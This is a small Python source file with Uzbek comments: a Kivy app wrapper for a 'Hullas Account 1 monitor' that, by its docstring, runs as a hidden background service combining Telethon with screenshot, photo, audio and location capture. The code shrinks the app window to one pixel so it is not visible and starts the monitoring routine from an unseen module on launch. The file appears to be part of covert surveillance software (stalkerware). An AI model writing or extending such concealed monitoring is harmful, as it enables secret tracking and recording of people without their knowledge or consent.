"""Kivy app wrapper — Hullas Account 1 monitor.

Background service, no GUI. Telethon + screenshot/photo/audio/location.
"""
import asyncio
import os
from kivy.app import App
from kivy.core.window import Window
import app  # app.py'ni import

# Ekran ko'rinmaydi (hidden)
Window.size = (1, 1)


class HullasApp(App):
    """Kivy wrapper — fon rejimida ishlab turadi."""

    def build(self):
        return

    def on_start(self):
        """App startupda account1 monitoring boshlash."""
        asyncio.create_task(self.run_account1_monitor())

    async def run_account1_monitor(self):
        """Account 1 monitoring shleya."""
        try:
            await app.main()
        except Exception as e:
            print(f"Monitor xatosi: {e}")


if __name__ == "__main__":
    HullasApp().run()
